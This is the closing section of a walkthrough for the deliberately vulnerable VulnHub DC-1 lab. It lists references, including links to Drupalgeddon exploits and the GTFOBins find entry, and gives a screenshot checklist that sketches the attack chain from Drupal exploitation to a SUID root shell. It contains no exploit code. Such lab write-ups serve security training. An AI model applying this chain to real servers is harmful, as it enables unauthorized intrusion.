- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/dc-1,292/>
- Drupal security advisory: <https://www.drupal.org/SA-CORE-2014-005>
- CVE-2014-3704 (NVD): <https://nvd.nist.gov/vuln/detail/CVE-2014-3704>
- Exploit-DB 34992 — Drupalgeddon (add admin user): <https://www.exploit-db.com/exploits/34992>
- Drupalgeddon2 (CVE-2018-7600) PoC: <https://github.com/dreadlocked/Drupalgeddon2>
- GTFOBins — `find`: <https://gtfobins.github.io/gtfobins/find/>
- Community writeups consulted:
  - [svesec/vulnhub-dc1 (GitHub)](https://github.com/svesec/vulnhub-dc1)
  - [Vulnhub DC-1 Walkthrough — Bazil Brohi (Medium)](https://mob1us86.medium.com/vulnhub-dc-1-walkthrough-939303a5b70a)
  - [DC-1: Vulnhub Walkthrough — Chikleet (Medium)](https://medium.com/@chikleet25/dc-1-vulnhub-walkthrough-878c94996a18)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan / netdiscover)
- [ ] `images/02-nmap.png` — port/service scan showing Drupal 7 on port 80
- [ ] `images/03-enum.png` — fingerprinting Drupal / CVE-2014-3704
- [ ] `images/04-foothold.png` — Metasploit Drupalgeddon session as `www-data`
- [ ] `images/05-shell.png` — `/var/www` flags and `settings.php` credentials
- [ ] `images/06-root-flag.png` — SUID `find` root shell and `/root/thefinalflag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
